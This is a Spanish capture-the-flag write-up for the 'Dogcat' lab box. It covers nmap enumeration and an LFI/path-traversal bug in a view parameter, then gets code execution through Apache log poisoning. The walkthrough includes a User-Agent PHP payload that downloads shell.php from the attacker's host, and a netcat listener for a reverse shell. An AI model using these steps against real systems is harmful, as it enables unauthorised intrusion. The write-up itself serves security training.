# Dogcat

Comenzamos como en todos los Write-Ups en enumerar la conectividad y los puertos que encontramos abiertos

```
ping ip
```

```
ping 10.10.55.221
PING 10.10.55.221 (10.10.55.221) 56(84) bytes of data.
64 bytes from 10.10.55.221: icmp_seq=1 ttl=64 time=1.81 ms
64 bytes from 10.10.55.221: icmp_seq=2 ttl=64 time=0.350 ms
^C
--- 10.10.55.221 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 0.350/1.082/1.815/0.733 ms
```

```
sudo nmap -sCV -T4 --min-rate 4000 ip
sudo nmap -sCV -T4 --min-rate 4000 ip -p- o -p
```

```
sudo nmap -sCV -T4 --min-rate 4000 10.10.55.221

Starting Nmap 7.60 ( https://nmap.org ) at 2024-10-28 15:05 GMT
Nmap scan report for ip-10-10-55-221.eu-west-1.compute.internal (10.10.55.221)
Host is up (0.00054s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (EdDSA)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
MAC Address: 02:8D:58:72:CE:E9 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.63 seconds
```

Nos encontramos los tipicos 80 y 22 abiertos, con lo cuál veremos que hay en la web ya sea con curl o metiendonos directamente

![image](https://github.com/user-attachments/assets/5ef49764-57a4-42a5-8fd3-c05d5c55a83b)

Podemos fijarnos de una cosa muy importante y que es muy fácil de ver. La URL vemos un directory traversal un /?view=

Si probamos a poner otra cosa que no sea dog o cat nos salta error, pero vemos que si ponemos por ejemplo /dog nos dice la ruta en la que se encuentra y podemos ver cosas importantes.

- Vemos la ruta /var/www/ tal tal
- Vemos que el archivo es obligatorio que empiece por .php
- Nos obliga a poner la ruta dog obligatoria


Vamos a probar Los tipicos de Directorio para probar, obviamente no vamos a atinar porque tenemos que tener las 3 características.

![image](https://github.com/user-attachments/assets/ab2e4c4a-c34d-49f9-8a2e-d1bddc3ea425)

¿Como lo he conseguido?

Como podemos ver tenemos las 3 características, quitamos la extensión php con &ext, nos vamos a la ruta /etc/passwd con ../../ y por ultimo empezamos con dog pero lo quitamos con ) 

Vamonos al developer para ver mejor el etc/host o cualquier otra cosa porque desde aquí podemos hacer cosas chulas.

[Apache log poisoning](https://www.hackingarticles.in/apache-log-poisoning-through-lfi/?ref=fr33s0ul.tech)

Vale después de que lo os leais os comento como funciona el LFI gracias al path traversal

Nos creamos una shell con pentest monkey, cuando la tengamos creada abrimos un servidor http y un netcat

```
python3 -m http.server
rlwrap nc -lvnp puerto
```

Cuando tengamos todo abierto, nos vamos a la dirección anterior y recogemos la URL

![image](https://github.com/user-attachments/assets/d47fd630-500b-4fc6-bf9a-ba57b54f1272)

Como vemos deberemos cambiar el user-agent a 

```
<?php file_put_contents('shell.php', file_get_contents('http://[your-host]/shell.php'))?>
```

Gracias a esto recogera el archivo en cuestión yo le he llamado "shell.php" vosotros lo podeir llamar como queraís

Posteriormente nos iremos a la url del target

http//target/shell.php

Y gg estamos dentro.

![image](https://github.com/user-attachments/assets/b8ee674e-c74c-484a-8038-7e2b927ea9f5)





